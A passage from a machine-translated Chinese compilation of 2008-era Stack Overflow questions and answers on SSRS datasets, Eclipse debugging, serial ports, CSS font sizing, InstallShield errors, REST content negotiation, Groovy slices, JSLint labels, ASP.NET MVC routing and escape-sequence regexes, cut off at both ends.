因为避免混淆嵌套很有用。

你宁愿读这个：

```
array[array[head].next].prev 
```

或这个：

```
head[array].next[array].prev 
```

Incidentally, C++ has a similar commutative property for function calls. Rather than writing `g(f(x))` as you must in C, you may use member functions to write `x.f().g()`. Replace f and g with lookup tables and you can write `g[f[x]]` (functional style) or `(x[f])[g]` (oop style). The latter gets really nice with structs containing indices: `x[xs].y[ys].z[zs]`. Using the more common notation that's `zs[ys[xs[x].y].z]`.

# reporting-services - 在 Reporting Service 报表中创建多个数据集

> ID：381545
> 
> 赞同：-1
> 
> 时间：2008-12-19T17:02:17.747
> 
> 标签：reporting-services, dataset

我有一个 SSRS 报告并使用 PL/SQL 来创建数据集。我的报告需要两张表 1 一张给出详细视图。（数据集 1） 2 下面一张给出汇总表（数据应来自基于 1 表中数据的计算）

我正在为数据集使用一个临时表。

获取数据集 2 的计算结果的方法是什么。

我为每个编写了 2 个程序。因为第一个表是一个临时表，所以我没有得到第二个数据集的结果。

为什么可以选择。

我可以在单个过程中拥有多个数据集吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2008-12-23T18:32:05.847

您最好的解决方案是创建两个都调用存储过程的数据集。确保两个存储过程使用相同的参数。

例如：

> 数据集 1 显示客户数据，唯一 id 是 customerID
> 
> 数据集 2 显示该客户的所有订单，唯一 ID 为 customerID

所以数据集 1 有一个存储过程，比如

```
 select * from customers where customerID = @customerID 
```

数据集 2 有一个存储过程，如

```
 select * from orders where customerID = @customerID 
```

您可以在两个数据集中使用相同的参数 ( `customerID`) 来获取您要查找的内容。数据集 1 将显示所有客户信息，数据集 2 将显示该客户的所有订单信息。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-01-06T07:16:04.333

我认为您正在尝试为小猫打一个小洞，为大猫打一个大洞:)。您只需要一个返回详细信息的过程，SSRS 可以将其分组以供您创建摘要。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-01-06T07:36:08.647

看看创建子报表。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-02-12T20:20:04.973

答案可能有点晚了，但我已经使用了向下钻取功能来完成这个。因此，您有一个报表来完成所有处理并将结果写入持久表，然后在数据集末尾聚合信息，并在摘要报表中显示信息。然后，您还可以创建一个从您编写的结果中选择的详细信息报告，并可能使用参数设置该报告。使用参数，您可以允许用户选择摘要报告中显示的数据的某些子集，方法是使详细报告中的逻辑依赖于传入的参数。希望有所帮助！

# java - 如何在 java 的调试详细信息格式化程序中将字节数组显示为字符串？

> ID：381546
> 
> 赞同：10
> 
> 时间：2008-12-19T17:03:13.720
> 
> 标签：java, eclipse, debugging

我想写一个简单的细节格式化程序，`byte[]`以 a 的形式显示数据`String`（`String.<init>([B)`用来做脏活）。

但是，我不确定`[B`在创建格式化程序时如何找到要使用的类名。这甚至可能吗？或者，是否有另一种方法可以在调试器中将字节数组视为字符串？

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2008-12-19T19:23:08.447

我不知道如何让 eclipse 的详细格式化程序自动将字节数组显示为字符串，但是您可以通过添加`new String(byteArray)`为监视表达式来显示特定的字节数组。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-12-19T18:39:03.730

如果您的问题是我如何将 [0,1,2] 字节数组的字符串表示为“[0,1,2]”，我建议您查看 Arrays.toString(byte[] )

[http://java.sun.com/javase/6/docs/api/java/util/Arrays.html#toString(byte[])](http://java.sun.com/javase/6/docs/api/java/util/Arrays.html#toString(byte[]))

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-11-13T11:05:29.760

您不能为简单的数据类型（如`byte`.

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-12-19T17:08:26.423

```
byte[].class 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-12-19T18:58:52.707

[B 类型可以用 byte[].class 检索。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2022-02-22T03:02:48.467

在 Idea 调试模式下，右键单击`byte[] data`要查看的并选择**View Text**。

![在此处输入图像描述](https://i.stack.imgur.com/Fr6uS.png)

# serial-port - 是否有任何处理串行端口通信的设计模式？

> ID：381548
> 
> 赞同：3
> 
> 时间：2008-12-19T17:03:56.167
> 
> 标签：serial-port, hardware, serial-communication

我们正在使用一些新的切割工具，它们可以通过串行端口而不只是控制面板来更改其硬件参数。

当硬件参数发生改变时，硬件将需要几秒钟来重新配置自身，然后发出信号表明它已准备好使用。

我们在此之前的设置涉及操作员单击切割板或零件命令。该软件将显示一个对话框，允许操作员更改与运动相关的任何内容（速度、延迟等），并显示硬件应采用的配置。操作员验证所有内容后，单击“确定”，机器开始切割。

对于新硬件，如果我们传输有更改，我们会提取当前配置，并弹出一个对话框，显示新配置是什么以及显示硬件是否准备就绪的指示器。并非所有事情都是通过串行端口自动完成的，因此有时对话框必须停留在那里，直到操作员单击“确定”。其他时候，当硬件发出正确信号时，它可以自行卸载。

我的问题（和疑问）是通过串行端口执行此操作非常缓慢。这也是我们第一次做这种类型的工作。我担心我错过了一些解决方案来使整个事情更具响应性。由于我们从第三方购买切割硬件，因此不能选择使用串行的替代品。

我想做的另一件事是可以选择显示状态对话框并让它继续运行，而不会让串行通信陷入系统的其余部分。

我正在寻找有关 Win32 API 或 .NET 的提示。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-12-19T17:07:30.480

一种选择是在单独的线程中运行串行端口通信，并让该线程将其状态报告回 gui 线程。（调用）

这就是我最近编写 HID 卡刷卡系统的方式。一个线程将卡片刷卡记录到列表中。另一个线程将这些写入数据库系统。每个都向 GUI 线程报告。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-12-29T21:46:34.420

这取决于机器控制的交互性 - 您可以只发送 moveto xy、cutto xy 还是需要持续监控机器并启动和停止电机？

如果机器相对智能，那么我会将其视为绘图仪。在你的 gui 中建立一个命令列表，然后提交它们。这样就很容易测试机器的 gui 独立性。

您还可以有一个测试应用程序，它获取命令列表并将其绘制在屏幕上作为检查，然后再切割昂贵的材料。甚至可以将命令转换为 HPGL 或 SVG 之类的东西并直接显示它们。

# css - 修复了Firefox中的字体大小？

> ID：381552
> 
> 赞同：0
> 
> 时间：2008-12-19T17:05:55.413
> 
> 标签：css, firefox, navigation, font-size

我想为所有浏览器保持导航菜单的字体大小相同。我将导航菜单文本的字体大小设置为特定的像素大小。在 IE 中这有效，但在 FF 中无效。

问题是，如果一个人改变了他们浏览器的字体大小，那么它会完全破坏 FF 中的菜单布局。

有没有办法为 FF 调整这个或者没有办法解决它？我知道它是为了可访问性，但否则会弄乱设计，我宁愿不使用图像而不是导航菜单的文本。

谢谢！

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2008-12-19T17:20:24.900

你有三个选择：

1.  修复您的菜单布局，使其更能容忍不同的字体大小（建议：很多用户不同意您选择的字体大小 - 不仅限于视障用户）。
2.  用图像替换文本（使用适当的替代文本！）；FF（和 IE）仍会在“缩放”模式下缩放它们，但不会破坏页面的布局。
3.  没做什么。将损坏的布局作为一个大的“FU”留给那些否则会费力阅读您的固定大小文本的用户。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-12-19T17:47:41.710

如果你试图让一切都固定下来，只为你的眼睛感到高兴，那么你正在打一场你不会赢的战斗。如果内容是供公众消费的，那么请理解公众女士对于她应该阅读的正确字体大小有不同的看法。

浏览器已经发展了很长时间，以阻止您试图阻止人们看到内容。

发展并理解字体大小应该用 CTRL + '+/-' 改变

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-12-19T17:19:26.167

获得这种控制级别的唯一保证方法是将文本呈现为图像。虽然这对于菜单（不经常更改）来说可以正常工作，但我已经看到它被*所有文本*都作为图像完成的网站可怕地滥用。

我有一个好朋友，他接受过印刷设计师的培训。当她刚开始做网页设计时，由于缺乏控制，几乎让她发疯。我建议她深呼吸，研究 CSS 盒子模型，然后设计为“正常”字体大小 +/- 1 大小。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-11-25T17:32:41.343

问题不在于有人在缩放，客户想要那样，就像他想要的那样，问题是 9pt 字体在 ie 7 和 8 和 chorme 中显示，但在 ff 中没有

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2010-07-30T11:35:04.277

还有另一种选择：

使用以下脚本检测用户的字体大小：[http ://www.alistapart.com/articles/fontresizing/](http://www.alistapart.com/articles/fontresizing/)

然后在“ems”中调整一个容器 div 以补偿用户大小。

例如，如果用户 font-size 为 22，base 为 20，则让您的容器 div 的 font-size 为 20/22（即 22*(20/22)=20）。:)

注意：您需要一个容器 div 的原因是因为您的事件侦听器会注意字体大小对正文的更改。

（这个答案可能会激怒一些可用性专家。对不起那些人。你确实有好点，但答案仍然是答案。：p）

* * *

PS。我想我最好附上我的实现代码只是为了证明它有效。我还没有为全局应用程序编辑此代码。它被复制和粘贴...注意诸如用常规浏览器检测条件（例如）替换我的 IE 条件（使用动态添加的 CSS 类）之类的东西。

这很长，但都是必要的：

```
updateBaseFontSize : function(fontSize,reloadBool){
                /*Format 1 is fed from the plug; format2 is the body size equiv
                 *examples:
                 *Frmt 1 (all/IE) | Frmt 2 (all/IE)
                 *20/18           | 16px/16px
                 *21/21           | 17.6px/19px
                 *22/23           | 19.2px/22px
                 *
                 *Purpose of updateBaseFontSize is:
                 * 1\. convert format 1 figures to format 2
                 * 2\. modify the all containing div 'fontbodyreadjust'
                 *    to compensate for the new user defined body font size
                 */

                var format1Base;
                var format1Size = fontSize; //equals new size in pixels
                var reloadPage = reloadBool; //prevents reload on 1st visit

                var baseConverter;
                var changeConverter;

                if ($('body').hasClass('browserIE')) {
                    format1Base = 19; //expected base size value for IE
                    baseConverter=16/19; //converts from format 1 to 2 for IE
                    changeConverter=1.5; //ditto for the difference from base size for IE
                } else {
                    format1Base = 20;//expected base size value for all other browsers
                    baseConverter=16/20; //converts from format 1 to 2 for all others
                    changeConverter=1.6; //ditto for the difference from base size for all others
                }

                //Find modifiedSize, how much to compensate for the new body size
                var format2Base = format1Base * baseConverter;

                var format2SizeChange = (format1Size-format1Base)*changeConverter;
                var format2NewSize = format2SizeChange + format2Base;

                var modifiedSize = format2Base/format2NewSize;

                //Allow text resizing for shrinking text and very very large text
                //Only works for safari. meant to prevent odd behavior at math extremes
                if ((format2NewSize >= format2Base)&&(modifiedSize>.6)){
                    $('#fontbodyreadjust').css('font-size',modifiedSize+'em');
                }

                //reloadPage boolean in place so that reload doesn't occur on first visit
                if (reloadPage){
                    window.location.reload()
                }
    },

    initHome : function(){

        // UNHIDE HOME PAGE CONTENT AFTER IT'S LOADED. OTHERWISE, LAYERED AND MESSY
        $('#slider').css('display', 'block');

                // PREVENT VARIOUS USER BROWSER-FONT RESIZE SCENARIOS
                // Note: irrelevant for browsers that zoom all elements simultaneously
                window.initFontResizeDetector = function(){
                        var iBase = TextResizeDetector.addEventListener(onFontResize,null);

                        //Don't run the updateBaseFontSize if font size is not larger than usual
                        if (iBase>20){
                            var reloadBoolean = false;
                            window.updateBaseFontSize(iBase,reloadBoolean);
                        }
                }

                //id of element to check for and insert control
                TextResizeDetector.TARGET_ELEMENT_ID = 'bodyContent';
                //function to call once TextResizeDetector has init'd
                TextResizeDetector.USER_INIT_FUNC = window.initFontResizeDetector;

                window.onFontResize = function(e,args) {
                        var iSize = args[0].iSize; //get new user defined size
//                        var iDelta = args[0].iDelta; //get new user defined size
//                        var iBase = args[0].iBase; //get new user defined size
                        var reloadBoolean = true;
//                        console.log(iSize,iDelta,iBase);
                        window.updateBaseFontSize(iSize,reloadBoolean);
                } 
```

# html - IE 的默认 CSS 值

> ID：381558
> 
> 赞同：9
> 
> 时间：2008-12-19T17:08:21.837
> 
> 标签：html, css, internet-explorer, firefox

我有一个我正在为工作而开发的 Web 应用程序，它对 Firefox 不太友好（设计是在我加入公司前 2 年完成的）。有一些 CSS 问题我遇到了问题，我不能使用 CSS 重置，因为页面设计几乎是一成不变的，它会导致比我现在需要的更多工作。

有没有人有 IE 的默认 CSS 值列表，所以我可以在 CSS 中设置它，这样这个东西会更 Firefox 友好？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-12-19T17:24:57.390

这是一个[CSS 比较图](http://en.wikipedia.org/wiki/Comparison_of_layout_engines_(CSS))。IE 实际上将 CSS 设置存储在非常愚蠢的地方*Registry*中。另一个问题是您的应用程序的文档类型是使用标准模式还是怪癖模式。

如果它使用的是[quirks mode](http://en.wikipedia.org/wiki/Quirks_mode)，那你就有麻烦了。修复非 IE 问题会破坏 IE 问题等。你会发疯的。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-12-19T17:13:18.147

TBH，如果 IE6 实际上在内部使用 CSS 来布置大多数 HTML 元素，我会感到惊讶，所以你正在寻找的东西可能甚至不存在。

W3C 在 CSS2 规范 ( [http://www.w3.org/TR/CSS2/sample.html](http://www.w3.org/TR/CSS2/sample.html) ) 中有一个示例样式表，它“描述了基于广泛研究的所有 HTML 4.0 ([HTML40]) 元素的典型格式当前的 UA 实践” - 将其复制到样式表中可能是您​​最好的做法。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-12-19T17:18:53.360

虽然我认为我从未见过发布过的列表，但 IE 开发人员工具栏可让您浏览各种元素的计算样式。使用您感兴趣的每个元素创建一个虚拟页面，但没有 CSS，然后挖掘出您需要的值？

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2008-12-19T17:48:38.557

我建议从另一端解决这个问题。

将当前仅 IE 样式表复制到全局样式表，并将 IE 样式表放入条件注释块中。使用全局样式表修复 Firefox 站点，然后使用 IE-only 样式表修复 IE 站点。

例如：

> ```
> <link href="/css/global.css" rel="stylesheet" type="text/css" />
> <!--[if IE ]>
>     <link href="/css/ie-only.css" rel="stylesheet" type="text/css" />
> <![endif]--> 
> ```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2008-12-19T17:30:03.867

我感觉到你的痛苦。这可能会解决大部分问题。

```
* {
    box-sizing: border-box;
    -moz-box-sizing: border-box;
    -webkit-box-sizing: border-box;
    -ms-box-sizing: border-box;
} 
```

# .net - 从 InstallShield 2009 MSI 安装 .NET 服务时出现问题 - 自定义操作未关闭 1 MSIHANDLE

> ID：381563
> 
> 赞同：1
> 
> 时间：2008-12-19T17:09:36.530
> 
> 标签：.net, windows, service, windows-installer, installshield

我正在使用**InstallShield 2009**为我继承的代码库生成**MSI 。**该代码由**VB6**和**.NET 2.0**代码（C# 和 C++）组成。我正在**Windows XP SP2**上开发和安装。

我通过从前一个团队提供的*MSI*逆向工程创建了*InstallShield*项目（称为它）。它们的配置现在相同。`"MyClient.ISM"`

 **然后我将InstallShield*配置为生成*MSI*。这建成，没有错误。但是，当我尝试运行我的*MSI*时，它失败了两个

> “错误 1001 InstallUtilLib.dll：未知错误”

对话框，然后成功退出它所做的更改然后我`MyClient.MSI`使用 msiexec 命令运行。例如

```
msiexec /lvx C:\inst_server.log /i "C:\MyClient.MSI" 
```

问题似乎是由于`2769 error`. 由此产生的日志文件中的错误位置如下：

```
DEBUG: Error 2769: Custom Action _A11801EAD1E34CFF981127F7B95C3BE5.install 
did not close 1 MSIHANDLEs. 
```

此自定义操作试图安装 .NET 服务。所以我然后去了*InstallShield*并删除了所有自定义操作（安装、卸载、提交和回滚以及相关的 SetProperty）并再次构建和安装。这有效，但不再安装服务。我现在需要使用有效的*InstallShield*方法安装这些 .NET 服务。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-08-19T23:03:16.110

我看到这是一个较老的问题，但我想我会试一试，以防有人需要帮助。

据我观察，所有错误 1001 都与 .NET Framework 有关。

首先，我会确保您正在使用您的 msi 构建 setup.exe 引导程序。使用 InstallShield Release 向导执行此操作，并确保在引导程序中包含应用程序所需的 .NET Framework 版本。可能是您的测试机器没有安装所需版本的 .NET Framework。

您提到的自定义操作是 InstallShield 在构建期间自动生成的。它创建了包装器自定义操作来调用组件中安装程序类中的方法。在您的情况下，这是您的组件安装程序类之一的 .install 方法。

如果您已确保正确部署 .NET Framework，但仍有问题，请考虑调试程序集中的安装程序类。（在这里查看更多信息：[http](http://www.hanselman.com/blog/BackToBasicsUsingFusionLogViewerToDebugObscureLoaderErrors.aspx) ://www.hanselman.com/blog/BackToBasicsUsingFusionLogViewerToDebugObscureLoaderErrors.aspx ）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-08-30T13:52:05.727

在 InstallShield 2009 基本 MSI 项目中，我也遇到了错误 1001。尝试将自动生成的 _isconfig.xml 添加到 Support Files\Language Independent 节点。这将确保在调用 InstallerClass 等 .NET 相关操作时正确启动 CLR。

在我的例子中，_isconfig.xml 内容引用了 .NET 2.0 运行时，但它也可以引用 1.0\1.1。

```
<?xml version="1.0"?>
<configuration>
    <startup>
        <supportedRuntime version="v2.0.50727"/>
    </startup>
</configuration> 
```

另请参阅：[Q108690：信息：使用 Cith Microsoft Visual Studio .NET 2003 或 2005 创建的合并模块](http://kb.acresso.com/selfservice/viewContent.do?externalID=Q108690)

# rest - REST Content-Type：应该基于扩展名还是Accept header？

> ID：381568
> 
> 赞同：53
> 
> 时间：2008-12-19T17:11:30.707
> 
> 标签：rest

RESTful Web 服务返回的表示（html、xml、json）应该由 url 还是由 Accept HTTP 标头确定？

* * *

## 回答 #1

> 赞同：34
> 
> 时间：2008-12-19T17:26:17.090

两者都是有效的。来自[xml.com](http://www.xml.com/pub/a/2004/08/11/rest.html)的报价：

> 一个资源可能有多个表示。有四种常用的方法可以向消费者提供正确的资源表示：
> 
> 1.  服务器驱动的协商。服务提供者根据其客户的先验知识确定正确的表示，或使用 HTTP 标头中提供的信息，例如 Accept、Accept-Charset、Accept-Encoding、Accept-Language 和 User-Agent。这种方法的缺点是服务器可能不知道客户真正想要什么。
> 2.  客户驱动的谈判。客户端向服务器发起请求。服务器返回可用表示的列表。客户端然后选择它想要的表示并向服务器发送第二个请求。缺点是客户端需要发送两个请求。
> 3.  代理驱动的协商。客户端通过代理向服务器发起请求。代理将请求传递给服务器并获取表示列表。代理根据客户端设置的偏好选择一种表示并将该表示返回给客户端。
> 4.  URI 指定的表示。客户端在 URI 查询字符串中指定它想要的表示。

* * *

## 回答 #2

> 赞同：17
> 
> 时间：2008-12-21T23:53:29.927

这是一个不问的问题。

接受取决于 conneg（内容协商）。Conneg 将让客户端通过 Accept: 标头决定他们接受的媒体类型。然后，响应将采用该格式，并带有 Vary: Accept 标头。

另一方面，将您的资源公开为 /resource.json 和 /resource.xml 也是可能且完全有效的。

理想情况是同时实现：/resource（支持 conneg 的通用 uri）/resource.xml /resource.json

/resource 返回的 conneg'd 版本可以根据协商的媒体类型简单地重定向到正确的 uri。或者，可以从通用 uri 返回正确的表示，并使用 Content-Location 指定返回的特定表示。

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2008-12-29T17:53:12.440

由于您提到的是 RESTful Web 服务而不是任何 Web 服务，因此我强烈推荐底层标准支持的内容 - HTTP 1.1 及其依赖于`Accept`HTTP 标头的内容协商。

正如我在我对[Can I change the headers send by the browser 的](https://stackoverflow.com/questions/374885/can-i-change-the-headers-of-the-http-request-send-by-the-browser)回答中所解释的那样，地址 (URI) 和表示是 RESTful 设计的两个不同支柱，它们不需要混合。**当存在header****时，不应滥用 URI 来嵌入可接受的表示形式`Accept`**。

只有当您的 Web 应用程序可能在中间节点涉及一些 HTTP 标头过滤的环境中运行和使用时，您才应该支持基于 URI 的内容协商。说实话，如果可能和可行的话，应该更换这种侵入性或功能不正常的代理。

干杯!
松兹拉

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2008-12-19T17:43:48.707

如果提供了 Accept 标头，则使用 URI 作为故障转移。

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2009-01-21T00:10:20.830

使用内容类型存在问题......我在我的博客[http://shouldersofgiants.co.uk/Blog](http://shouldersofgiants.co.uk/Blog/post/2008/10/02/Creating-a-RESTful-Web-Service-Using-ASPNet-MVC-Part-3-e28093-Multiple-Representations.aspx)上讨论了这个问题，最后决定按照 Richardson 和 Ruby 在 RESTful Web Services 中的建议在 URI 中包含表示

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2013-01-14T16:45:29.650

请参阅[第 5 章 - 代表性状态转移（REST）](http://www.ics.uci.edu/~fielding/pubs/dissertation/rest_arch_style.htm)，第*5.2.1.2*节Roy Fielding关于建筑风格的[论文的表示：](http://www.ics.uci.edu/~fielding/pubs/dissertation/top.htm)

> 表示的数据格式称为媒体类型[[48]](http://www.ics.uci.edu/~fielding/pubs/dissertation/references.htm#ref_48)。

查看链接，我们看到它指的是 MIME。所以我假设在 HTTP 用语中，它用`Content-Type`POST/PUT的`Accept`标头和 GET 的标头来表示。

这是该段的其余部分（为了完整起见）：

> 表示可以包含在消息中，并由接收者根据消息的控制数据和媒体类型的性质进行处理。一些媒体类型旨在用于自动化处理，一些旨在呈现以供用户查看，而少数媒体类型能够同时具备这两种功能。复合媒体类型可用于在单个消息中包含多个表示。

PS：我不确定为什么人们从不查看实际定义 REST 的地方......

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2008-12-19T17:26:48.943

由于很多 RESTful URL 没有扩展名，因此您应该/必须基于 Content-Type

编辑：我并不是说这听起来像它那样刺耳，更多的是你必须注意内容类型并且并不总是能够引用扩展名

# syntax - Groovy 语法解释/资源

> ID：381573
> 
> 赞同：4
> 
> 时间：2008-12-19T17:13:01.250
> 
> 标签：syntax, groovy

我昨天开始涉足groovy。在我理解的 groovy 网站上有一个示例，但我想更多地了解它为什么会这样工作。让我困惑的是`who[1..-1]`。这像是在说`who[1..who.length()-1]`吗？我找不到有关此语法的任何文档。[除了http://groovy.codehaus.org/](http://groovy.codehaus.org/)上的内容之外，还有什么好的 groovy 教程吗？

```
class Greet {
  def name
  Greet(who) { name = who[0].toUpperCase() +
                      who[1..-1] }
  def salute() { println "Hello $name!" }
}

g = new Greet('world')  // create object
g.salute()              // Output "Hello World!" 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2008-12-19T17:21:51.887

你是对的 - 范围内的负数基本上是指列表的*结尾*，而不是开头。`-x`相当于`who.length()-x`。

您正在处理的内容在 Python中称为*切片。*（我之所以提到术语，是因为搜索“groovy slices”之类的内容可能会帮助您找到更多信息，尽管我不知道它们是否真的被称为 Groovy 的“slices”。）您可以找到有关此特定内容的更多信息语法功能[在这里](http://groovy-lang.org/semantics.html#_collections_and_arrays)。

至于其他资源，我发现*Groovy in Action*一书对于学习 Groovy 非常方便。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-12-21T05:30:05.693

对于几种语言，[PLEAC](http://pleac.sourceforge.net/pleac_groovy/index.html)是一个很好的资源。

# javascript - 获取有关 Javascript 中标签的 JSLint 警告

> ID：381580
> 
> 赞同：4
> 
> 时间：2008-12-19T17:16:21.977
> 
> 标签：javascript, jslint

在我的 javascript 我有这个

```
 loopDeLoop:
        while (foo !== bar) {
            switch (fubar) {
                case reallyFubar:
                    if (anotherFoo == anotherBar) {
                        break loopDeLoop;
                    }
                    break;
                default:
                    break;
            }
        } 
```

但是 JSLint 说... lint 警告：使用标签

这是来自[JSLint的笔记](http://www.jslint.com/lint.html)

> 标签
> JavaScript 允许任何语句都有一个标签，并且标签有一个单独的名称空间。JSLint 更严格。
> 
> JSLint 只需要与 break 交互的语句上的标签：switch、while、do 和 for。JSLint 期望标签与变量和参数不同。

如何构建上述内容以消除警告？

谢谢，
格雷格

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2008-12-19T22:08:29.860

您正确使用了标签。

JSLint 发出警告，因为 Javascript 中的标签风格非常糟糕，而 JSLint 希望您知道这一点。

重申一下，如果您完全使用标签，即使是正确的，JSLint 也会发出警告。

编辑：看起来您可以使用`-use_of_label`配置指令禁用标签警告。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-12-19T17:38:24.867

您可以设置一个标志来确定您是否在循环中完成工作。

```
var done = false;
while (foo !== bar && !done) {
    switch (fubar) {
        case reallyFubar:
            if (anotherFoo == anotherBar) {
                done = true;
            }
            break;

        default:
            break;
    }

    if(!done) {
        //If you have more logic inside the loop, put it here
    }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-12-19T17:38:30.280

有点难以提出建议，因为在您的示例中，两个循环和开关之间的关系是如何保持不透明的......但是您总是可以将隐式外循环转换为显式外循环，将内循环置于闭包中：

```
while ( (function() // loop while function returns true
{
   while (foo !== bar) 
   {
      switch (fubar) 
      {
         case reallyFubar:
            if (anotherFoo == anotherBar)
            {
               return true; // back to outer loop
            }
            break;
         default:
            break;
       }
   }
   return false; // done looping
})()) {}; 
```

在诉诸像这样丑陋的东西之前，我可能会尝试将内部循环中隐含的任何算法分解为一个单独的函数。

# asp.net-mvc - ASP.Net MVC 路由 URL 查询字符串

> ID：381582
> 
> 赞同：1
> 
> 时间：2008-12-19T17:16:41.633
> 
> 标签：asp.net-mvc, model-view-controller, url, routing, query-string

有没有办法链接到另一个显示搜索结果的视图而无需使用查询字符串？例如，我知道我可以执行以下操作：

```
[AcceptVerbs(HttpVerbs.Post)]
public ActionResult Index(string txtOrderNumber)
{
    return RedirectToAction("OrderLookup", new { controller = "Report", id = txtOrderNumber });            
} 
```

但是，假设我只想使用超链接（带有订单号的超链接）而不是表单帖子。如何在不使用查询字符串的情况下路由到结果视图？非常感谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-12-22T14:30:54.383

将 txtOrderNumber 参数重命名为 id。然后它将被默认路由拾取。或者，在与默认路由中的 id 值相同的位置引入一个名为 txtOrderNumber 的新路由，并将其限制为仅响应此控制器。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-05-04T20:48:17.887

埃里克，

对于 webforms，命令参数通过发布传递，值存储在控件中（我相信存储在隐藏字段或也是隐藏字段的视图状态中），但页面确实回发。

如果您不想发帖并且不使用查询字符串，我能想到的唯一解决方案是让您在同一页面上发帖，捕获 id 并将其存储在 TempData 中，然后执行 RedirectToAction。在控制器中，只需使用从上一页存储的 TempData 值。

这仍然会生成一个帖子，但如果用户刷新页面，他们将不会看到“重新发送数据”消息。

# java - 将 Eclipse 中“Watch”的值输出到日志文件

> ID：381586
> 
> 赞同：1
> 
> 时间：2008-12-19T17:18:39.210
> 
> 标签：java, eclipse, debugging, watch

我有一段无法编辑的 Java 代码，我想调试它。

问题是我的 10,000 条记录中的一条存在数据错误并导致应用程序崩溃。

我可以远程调试实时应用程序并添加手表，它会在处理每个记录时获取记录的 ID。问题是当处理“坏记录”并退出方法时，手表中保存的值会丢失，所以我不知道是哪条记录导致了问题。

有什么方法可以存储/打印手表中的值

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-12-21T04:32:08.850

如果错误记录通过抛出异常导致您的应用程序崩溃，请尝试在该异常上放置一个断点，也许记录信息仍将在该方法的堆栈帧中可用。这个没试过，只是一个想法。祝你好运。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-12-19T22:09:27.843

可能你可以启动你自己修改过的 Eclipse，其中包含一个**[watchExpressionDelegates](http://help.eclipse.org/stable/index.jsp?topic=/org.eclipse.platform.doc.isv/reference/extension-points/org_eclipse_debug_core_watchExpressionDelegates.html)扩展点**。

您将实现该委托类的类`org.eclipse.jdt.internal.debug.ui.JavaWatchExpressionDelegate`可能有机会做它想做的任何事情，包括记录信息。

我尚未对其进行测试，但如果您成功实施，请告诉我们。

# regex - 为转义序列实现解析器

> ID：381592
> 
> 赞同：4
> 
> 时间：2008-12-19T17:20:17.367
> 
> 标签：regex, parsing, escaping

我想解析一个保持对象图状态的自定义字符串格式。这是 ASP.NET 场景，我希望在客户端 (JavaScript) 和服务器 (C#) 上易于使用。

我有一个类似的格式

```
{Name1|Value1|Value2|...|ValueN}{Name2|Value1|...}{...}{NameN|...} 
```

在这种格式中，我有 3 个分隔符，`{`,`}`和`|`. 此外，因为这些字符在名称/值中是可以想象的，所以我使用非常常见的 定义了一个转义序列`\`，这样`\{`,`\}`和`\|`都被解释为它们自己的正常版本，当然`\\`是反斜杠。都很标准。

最初我尝试使用正则表达式来尝试解析出具有类似 this 的对象的字符串表示`(?<!\\)\{(.*?)(?<!\\)\}`。请记住`\`,`{`和`}`都保留在正则表达式中。这当然将能够`{category|foo\}|bar\{}`正确解析出类似的东西。但是我意识到它会失败，比如`{category|foo|bar\\}`.

我只花了一分钟左右的时间来尝试这个`(?<!(?<!\\)\\)\{(.*?)(?<!(?<!\\)\\)\}`并意识到这种方法是不可能的，因为您需要无限数量的负面回溯来处理潜在的无限数量的转义序列。当然，我不可能拥有超过一两个级别，因此我可能可以对其进行硬编码。但是，我觉得这是一个足够普遍的问题，它应该有一个明确的解决方案。

我的下一个方法是尝试编写一个已定义的解析器，在该解析器中我实际扫描输入缓冲区并以只进的方法使用每个字符。我实际上还没有完成这个，但它似乎过于复杂，我觉得我一定错过了一些明显的东西。我的意思是，只要我们有计算机语言，我们就有了解析器。

所以我的问题是用可能的转义序列解码这样的输入缓冲区的最简单、有效和优雅的方法是什么？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2008-12-19T17:48:34.050

```
(?<!\\)(?:\\\\)*\{(.*?(?<!\\)(?:\\\\)*)\} 
```

`(?<!\\)`将阻止任何`\`在此之前。

`(?:\\\\)*`将允许任意数量的转义`\`。

`\{`匹配一个左大括号。

`(`开始一个捕获组。

`.*?`匹配内容，包括任何`|`.

`(?<!\\)`将阻止任何`\`在此之前。

`(?:\\\\)*`将允许任意数量的转义`\`。

`)`结束捕获组。

`\}`匹配右大括号。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-03-09T19:37:33.593

这种解析器很容易用最少的状态跟踪来完成。下面花了我几分钟，相当难看，甚至做了一点点错误检查。:)

可以说，它比复杂的正则表达式更具可读性，尽管前者更简洁一些。

```
struct RECORD
{
    public string[] Entries;
